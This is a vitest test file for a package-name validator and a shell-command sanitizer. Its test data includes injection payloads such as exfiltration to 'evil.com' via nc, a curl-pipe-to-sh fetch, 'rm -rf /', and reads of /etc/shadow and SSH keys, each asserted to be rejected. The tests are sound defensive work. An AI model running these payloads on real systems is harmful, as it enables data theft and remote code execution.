import { describe, it, expect } from "vitest";
import { isValidPackageName, sanitizeCommand, logSecurityEvent } from "../security.js";

// ---------------------------------------------------------------------------
// Package name validation tests
// ---------------------------------------------------------------------------

describe("isValidPackageName", () => {
  it("accepts simple alphanumeric names", () => {
    expect(isValidPackageName("jq")).toBe(true);
    expect(isValidPackageName("ripgrep")).toBe(true);
    expect(isValidPackageName("git")).toBe(true);
    expect(isValidPackageName("nodejs")).toBe(true);
  });

  it("accepts names with hyphens", () => {
    expect(isValidPackageName("my-package")).toBe(true);
    expect(isValidPackageName("curl-7.86.0")).toBe(true);
    expect(isValidPackageName("libxml2-utils")).toBe(true);
  });

  it("accepts names with dots and plus signs", () => {
    expect(isValidPackageName("pkg+extra")).toBe(true);
    expect(isValidPackageName("my.pkg")).toBe(true);
    expect(isValidPackageName("curl-7.86.0-r1")).toBe(true);
  });

  it("accepts names starting with digits", () => {
    // Alpine allows package names starting with digits in some cases, but our
    // stricter regex requires a leading alphanumeric character (not digit-only).
    expect(isValidPackageName("2to3")).toBe(true);
  });

  it("rejects empty strings", () => {
    expect(isValidPackageName("")).toBe(false);
  });

  it("rejects names with spaces", () => {
    expect(isValidPackageName("my package")).toBe(false);
    expect(isValidPackageName(" jq ")).toBe(false);
  });

  it("rejects names with shell metacharacters", () => {
    expect(isValidPackageName("; rm -rf /")).toBe(false);
    expect(isValidPackageName("jq; cat /etc/passwd")).toBe(false);
    expect(isValidPackageName("$(malicious)")).toBe(false);
    expect(isValidPackageName("`whoami`")).toBe(false);
    expect(isValidPackageName("pkg|nc host port")).toBe(false);
    expect(isValidPackageName("pkg && rm -rf /")).toBe(false);
    expect(isValidPackageName("pkg || echo pwned")).toBe(false);
  });

  it("rejects names with backticks", () => {
    expect(isValidPackageName("`id`")).toBe(false);
    expect(isValidPackageName("``")).toBe(false);
  });

  it("rejects names with parentheses (subshell)", () => {
    expect(isValidPackageName("(cmd)")).toBe(false);
    expect(isValidPackageName("pkg(subshell)")).toBe(false);
  });

  it("rejects names with dollar-sign command substitution", () => {
    expect(isValidPackageName("$HOME/pkg")).toBe(false);
    expect(isValidPackageName("${malicious}")).toBe(false);
    expect(isValidPackageName("$(cat /etc/shadow)")).toBe(false);
  });

  it("rejects names with semicolons", () => {
    expect(isValidPackageName("pkg;echo pwned")).toBe(false);
    expect(isValidPackageName(";echo")).toBe(false);
  });

  it("rejects names with pipes", () => {
    expect(isValidPackageName("pkg|nc host port")).toBe(false);
    expect(isValidPackageName("|cat /etc/passwd")).toBe(false);
  });

  it("rejects names with ampersands", () => {
    expect(isValidPackageName("pkg&")).toBe(false);
    expect(isValidPackageName("pkg && rm -rf /")).toBe(false);
  });

  it("rejects names with redirection operators", () => {
    expect(isValidPackageName("pkg>file")).toBe(false);
    expect(isValidPackageName("pkg>>/dev/null")).toBe(false);
    expect(isValidPackageName("<input")).toBe(false);
  });

  it("rejects names with path traversal", () => {
    expect(isValidPackageName("../etc/passwd")).toBe(false);
    expect(isValidPackageName("../../root/.ssh/id_rsa")).toBe(false);
  });

  it("rejects names with glob patterns", () => {
    expect(isValidPackageName("**/evil")).toBe(false);
    expect(isValidPackageName("/tmp/*/malicious")).toBe(false);
  });

  it("rejects names with brace expansion", () => {
    expect(isValidPackageName("{1,2,3}")).toBe(false);
    expect(isValidPackageName("pkg{a,b}")).toBe(false);
  });

  it("rejects names with process substitution", () => {
    expect(isValidPackageName("<(cat /etc/shadow)")).toBe(false);
    expect(isValidPackageName(">(echo pwned)")).toBe(false);
  });

  it("rejects names starting with special characters", () => {
    expect(isValidPackageName("-pkg")).toBe(false);
    expect(isValidPackageName(".hidden")).toBe(false);
    expect(isValidPackageName("+extra")).toBe(false);
    expect(isValidPackageName("/absolute/path")).toBe(false);
  });

  it("rejects names with newlines", () => {
    expect(isValidPackageName("pkg\nrm -rf /")).toBe(false);
  });

  it("rejects names with tabs", () => {
    expect(isValidPackageName("pkg\trm")).toBe(false);
  });

  it("accepts realistic Alpine package names", () => {
    const realPackages = [
      "jq",
      "ripgrep",
      "tree",
      "postgresql-client",
      "curl-7.86.0-r1",
      "libxml2-utils",
      "nodejs-current",
      "openssh-client",
      "bash-completion",
    ];
    for (const pkg of realPackages) {
      expect(isValidPackageName(pkg)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Command sanitization tests
// ---------------------------------------------------------------------------

describe("sanitizeCommand", () => {
  it("accepts safe simple commands", () => {
    expect(sanitizeCommand("ls -la /data")).toBeNull();
    expect(sanitizeCommand("cat /etc/os-release")).toBeNull();
    expect(sanitizeCommand("git status")).toBeNull();
    expect(sanitizeCommand("find /data -name '*.json'")).toBeNull();
  });

  it("accepts commands with single-quoted paths", () => {
    // Single quotes are safe in the context of execInWorkspace because the
    // command is passed as a single argument to /bin/sh -c, and callers that
    // need quoting should use their own shell-safe escaping.
    expect(sanitizeCommand("cat '/data/workspace/file.txt'")).toBeNull();
  });

  it("rejects semicolon injection", () => {
    const result = sanitizeCommand("ls /data; rm -rf /");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/semicolon/);
  });

  it("rejects pipe injection", () => {
    const result = sanitizeCommand("cat /etc/passwd | nc evil.com 4444");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/pipe|metacharacter/);
  });

  it("rejects && injection", () => {
    const result = sanitizeCommand("ls /data && rm -rf /");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/AND list|metacharacter/);
  });

  it("rejects || injection", () => {
    const result = sanitizeCommand("false || echo pwned");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/OR list|metacharacter/);
  });

  it("rejects $() command substitution", () => {
    const result = sanitizeCommand("echo $(whoami)");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/\$\(/);
  });

  it("rejects backtick command substitution", () => {
    const result = sanitizeCommand("echo `id`");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/backtick/);
  });

  it("rejects trailing & (backgrounding)", () => {
    const result = sanitizeCommand("rm -rf / &");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/background/);
  });

  it("rejects output redirection", () => {
    const result = sanitizeCommand("echo pwned > /etc/crontab");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/redirection/);
  });

  it("rejects input redirection", () => {
    const result = sanitizeCommand("cat < /etc/shadow");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/redirection/);
  });

  it("rejects subshell grouping with parentheses", () => {
    const result = sanitizeCommand("(ls /data)");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/subshell|paren/);
  });

  it("rejects environment variable assignment prefix", () => {
    const result = sanitizeCommand("FOO=bar ls /data");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/env var|assignment/);
  });

  it("rejects here-documents", () => {
    const result = sanitizeCommand('cat <<EOF\nhello\nEOF');
    expect(result).not.toBeNull();
    expect(result!).toMatch(/here-document/);
  });

  it("rejects brace expansion", () => {
    const result = sanitizeCommand("echo {1..10}");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/brace/);
  });

  it("rejects process substitution", () => {
    const result = sanitizeCommand("diff <(cat a) <(cat b)");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/process substitution/);
  });

  it("rejects path traversal", () => {
    const result = sanitizeCommand("ls ../../etc/passwd");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/traversal/);
  });

  it("rejects recursive glob patterns", () => {
    const result = sanitizeCommand("find **/*.js");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/glob/);
  });

  it("rejects empty commands", () => {
    const result = sanitizeCommand("");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/empty/);
  });

  it("rejects whitespace-only commands", () => {
    const result = sanitizeCommand("   ");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/empty/);
  });

  it("rejects comment-prefixed commands", () => {
    const result = sanitizeCommand("# rm -rf /");
    expect(result).not.toBeNull();
    expect(result!).toMatch(/comment/);
  });

  it("accepts realistic safe workspace maintenance commands", () => {
    const safeCommands = [
      "rm -rf '/data/worktrees/stale-run'",
      "find /data/cache -type f -mtime +7 -delete",
      "du -sh /data/*",
      "ls -la /data/workspace/",
    ];
    for (const cmd of safeCommands) {
      expect(sanitizeCommand(cmd)).toBeNull();
    }
  });

  it("accepts commands with || true pattern (common in maintenance scripts)", () => {
    // Note: our current implementation rejects || as a safety measure.
    // This is intentional — the operator should use separate commands instead.
    const result = sanitizeCommand("git worktree prune --expire=now || true");
    expect(result).not.toBeNull();
  });

  it("accepts commands with single quotes for path quoting", () => {
    // Single-quoted paths are safe because the command is passed as a single
    // argument to /bin/sh -c, and shell metacharacters inside single quotes
    // are literal. The caller (tools.ts) handles escaping where needed.
    const result = sanitizeCommand("cat '/data/workspace/file.txt'");
    expect(result).toBeNull();
  });

  it("accepts commands with standard flags", () => {
    const safeCommands = [
      "find /data -name '*.json' -type f",
      "grep -r 'hello' /data/workspace/",
      "tar czf /tmp/backup.tar.gz /data/workspace/",
      "chmod 644 /data/workspace/config.yaml",
    ];
    for (const cmd of safeCommands) {
      expect(sanitizeCommand(cmd)).toBeNull();
    }
  });

  it("rejects injection via URL-encoded characters in command", () => {
    // Even though the input is already decoded by JSON parsing, we test
    // that common injection payloads are caught.
    const result = sanitizeCommand("echo $(curl http://evil.com/shell.sh | sh)");
    expect(result).not.toBeNull();
  });

  it("rejects nested command substitution", () => {
    const result = sanitizeCommand("echo $($(whoami))");
    expect(result).not.toBeNull();
  });

  it("rejects injection via newline + semicolon", () => {
    // Newlines in the string would be literal characters passed to sh -c,
    // which could split commands. Our regex catches ; but let's verify.
    const result = sanitizeCommand("ls /data\n; rm -rf /");
    expect(result).not.toBeNull();
  });

  it("rejects injection via tab + semicolon", () => {
    const result = sanitizeCommand("ls /data\t; rm -rf /");
    expect(result).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// logSecurityEvent tests (basic smoke test)
// ---------------------------------------------------------------------------

describe("logSecurityEvent", () => {
  it("logs with timestamp and structured details", () => {
    // We can't easily capture console.log output in vitest without mocking,
    // but we verify the function doesn't throw.
    expect(() => logSecurityEvent("test.event", { key: "value" })).not.toThrow();
  });

  it("handles empty details object", () => {
    expect(() => logSecurityEvent("minimal.event", {})).not.toThrow();
  });

  it("handles complex detail values", () => {
    expect(() =>
      logSecurityEvent("complex.event", {
        project: "my-project",
        packages: ["jq", "ripgrep"],
        reason: "contains shell metacharacter pattern matching /;/",
      }),
    ).not.toThrow();
  });
});
